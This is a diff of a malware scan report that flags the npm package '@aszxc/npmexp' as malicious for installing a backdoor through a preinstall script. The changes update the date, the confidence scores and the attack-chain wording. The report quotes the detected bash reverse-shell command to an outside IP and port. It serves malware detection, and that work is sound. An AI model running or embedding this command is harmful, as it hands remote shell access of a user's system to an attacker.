@@ -3,14 +3,14 @@
 ## Package Information
 - **Package Name:** `@aszxc/npmexp`
 - **Version:** `1.0.1`
-- **Scan Date:** 2025-12-21T01:12:37
+- **Scan Date:** 2025-12-21T04:26:28
 
 ---
 
 ## Final Security Verdict: **MALICIOUS** (Policy: Blocked)
 
 **Risk Level:** SEV-1 (Critical) **CRITICAL**  
-**Confidence Score:** 90.0%
+**Confidence Score:** 86.4%
 
 ### Executive Summary
 Backdoor installation via preinstall script The detected behaviors have no legitimate justification based on the package's stated purpose.
@@ -40,7 +40,7 @@ Backdoor installation via preinstall script The detected behaviors have no legit
 bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'
 ```
 
-**Attack Chain:** The detected behaviors form a coherent attack chain: Backdoor installation -> Reverse shell connection
+**Attack Chain:** The detected behaviors form a coherent attack chain: Backdoor installation via preinstall script -> Network Call -> Reverse Shell Connection
 
 **Legitimacy Assessment:** The behavior of establishing a reverse shell connection to a remote server is not expected for a package named '@aszxc/npmexp'
 
@@ -62,7 +62,7 @@ bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'
 **Behaviors Detected:** 1
 **Risk Categories:** backdoor_installation
 **Highest Detection Confidence:** 90.0%
-**Verification Confidence:** 90.0%
+**Verification Confidence:** 84.0%
 
 
 ---
